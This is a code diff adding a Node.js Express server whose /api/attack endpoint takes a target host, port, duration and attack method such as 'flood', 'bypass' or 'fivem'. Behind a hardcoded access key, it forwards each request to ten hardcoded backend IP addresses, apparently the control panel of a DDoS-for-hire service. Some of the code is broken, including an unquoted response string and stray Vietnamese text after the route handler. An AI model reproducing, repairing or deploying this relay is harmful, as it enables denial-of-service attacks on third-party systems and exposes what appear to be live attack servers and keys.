@@ -1,0 +1,120 @@
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const port = 80;
+
+app.get('/api/attack', async (req, res) => {
+  try {
+    const key = req.query.key;
+    const host = req.query.host;
+    const port = req.query.port;
+    const time = req.query.time;
+    const method = req.query.method;
+
+  if (!key || !host || !time || !method || !port) {
+      return res.status(400).send('Sai Định Dạng: -> /api/attack?key=&host=&port=&time=&method=.');
+    }
+
+  if (key !== "deptrai123") {
+    const err_key = {
+      status: `error`,
+      message: `Error Keys`,
+    };
+    return res.status(400).send(err_key);
+  }
+
+  if (time > 500) {
+    const err_time = {
+      status: `error`,
+      message: `Error Time < 60 Second`,
+    };
+    return res.status(400).send(err_time);
+  }
+  if (port > 443 || port < 1) {
+    const err_time = {
+      status: `error`,
+      message: `Error Port`,
+    };
+    return res.status(400).send(err_time);
+  }
+
+  if (
+    !(
+      method.toLowerCase() === "fivem" ||
+      method.toLowerCase() === "hydra" ||
+      method.toLowerCase() === "kill" ||
+      method.toLowerCase() === "flood" ||
+      method.toLowerCase() === "bypass" ||
+      method.toLowerCase() === "raw"
+    )
+  ) {
+    const err_method = {
+      status: `error`,
+      method_valid: `Error Methods`,
+    };
+    return res.status(400).send(err_method);
+  }
+
+    const response1 = await axios.get(`http://104.248.155.182:9998/api/attack?host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data1 = response1.data;
+
+    // Gọi API 2
+    const response2 = await axios.get(`http://143.198.93.17:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data2 = response2.data;
+
+    // Gọi API 3
+    const response3 = await axios.get(`http://143.198.95.145:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data3 = response3.data;
+
+    // Gọi API 4
+    const response4 = await axios.get(`http://143.198.93.17:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data4 = response4.data;
+
+    // Gọi API 1
+    const response5 = await axios.get(`http://139.59.230.174:9998/api/attack?host=${host}&port=${port}&time=${time}&method=${method}`);
+    const data5 = response5.data;
+
+    // Gọi API 2
+    const response6 = await axios.get(`http://143.198.81.166:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data6 = response6.data;
+
+    // Gọi API 3
+    const response7 = await axios.get(`http://104.248.148.235:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data7 = response7.data;
+
+    // Gọi API 4
+    const response8 = await axios.get(`http://143.198.87.158:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data8 = response8.data;
+
+    // Gọi API 3
+    const response9 = await axios.get(`http://178.128.23.39:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method} `);
+    const data9 = response9.data;
+
+    // Gọi API 4
+    const response10 = await axios.get(`http://104.248.155.182:9998/api/attack?key=nat123&host=${host}&port=${port}&time=${time}&method=${method}`);
+    const data10 = response10.data; 
+
+    const combinedData = {
+      data1,
+      data2,
+      data3,
+      data4,
+      data5,
+      data6,
+      data7,
+      data8,
+      data9,
+      data10,
+    };
+
+// Trả về kết quả
+    res.json({ message: Attack Sent });
+  } catch (error) {
+    console.error(error);
+    res.status(500).send('Error API.');
+  }
+}); trả về kết quả dạng text đứng thẳng
+
+app.listen(port, () => {
+  console.log(`Server đang chạy tại http://localhost:${port}`);
+});
